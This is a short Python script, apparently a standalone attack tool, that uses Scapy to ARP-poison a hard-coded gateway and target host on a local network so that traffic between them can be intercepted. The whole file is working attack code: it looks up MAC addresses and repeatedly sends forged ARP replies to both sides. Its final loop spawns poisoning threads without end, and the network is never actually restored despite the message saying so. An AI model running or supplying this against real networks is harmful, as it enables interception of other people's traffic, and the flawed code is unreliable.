from scapy.all import *
import os
import signal
import sys
import threading
import time

#ARP Poison parameters
from scapy.layers.l2 import ARP

gateway_ip = "192.168.1.1"
target_ip = "192.168.1.33"
packet_count = 1000

def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")

gateway_mac = get_mac(gateway_ip)
target_mac = get_mac(target_ip)

#ARP poison thread
while 1:
  poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
  poison_thread.start()
